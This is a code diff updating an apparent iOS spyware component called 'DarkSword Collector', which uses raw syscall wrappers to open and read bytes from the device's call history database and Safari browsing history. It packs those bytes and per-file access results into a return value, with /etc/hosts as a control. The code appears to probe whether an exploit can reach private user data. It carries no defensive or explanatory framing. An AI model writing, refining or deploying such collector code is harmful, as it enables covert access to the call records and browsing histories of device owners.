@@ -1,11 +1,7 @@
 /**
- * DarkSword Collector v23 - Read 1 byte each from 3 files
- * bits 0-7: CallHistory byte
- * bits 8-15: Safari byte  
- * bits 16-23: /etc/hosts byte (control)
- * bits 24-25: CallHistory status (00=denied, 01=open_only, 11=read_ok)
- * bits 26-27: Safari status
- * bits 28-29: hosts status
+ * DarkSword Collector v24 - Fixed encoding
+ * Per file: status(2 bits) at bits fi*10+0, byte(8 bits) at bits fi*10+2
+ * fi=0: CallHistory, fi=1: Safari, fi=2: /etc/hosts (control)
  */
 
 static long _svc1(long n, long a) {
@@ -34,7 +30,9 @@ static long _svc3(long n, long a, long b, long c) {
 #define SYS_read  3
 #define SYS_close 6
 
+/* Returns status (0=denied, 1=open_only, 3=read_ok) and writes byte to *out */
 static int _read1(const char *path, unsigned char *out) {
+    *out = 0;
     int fd = (int)_svc2(SYS_open, (long)path, 0);
     if (fd < 0) return 0;
     int n = (int)_svc3(SYS_read, fd, (long)out, 1);
@@ -43,17 +41,20 @@ static int _read1(const char *path, unsigned char *out) {
 }
 
 int ds_start(void) {
-    unsigned char ch = 0;
-    int s;
+    unsigned char ch;
+    int s, result = 0;
 
+    /* fi=0: CallHistory */
     s = _read1("/var/mobile/Library/CallHistoryDB/CallHistory.storedata", &ch);
-    int result = (int)ch | (s << 8);
+    result |= (s & 3) | (((int)ch & 0xFF) << 2);
 
+    /* fi=1: Safari */
     s = _read1("/var/mobile/Library/Safari/History.db", &ch);
-    result |= ((int)ch << 10) | (s << 18);
+    result |= ((s & 3) << 10) | (((int)ch & 0xFF) << 12);
 
+    /* fi=2: /etc/hosts (control) */
     s = _read1("/etc/hosts", &ch);
-    result |= ((int)ch << 20) | (s << 28);
+    result |= ((s & 3) << 20) | (((int)ch & 0xFF) << 22);
 
     return result;
 }
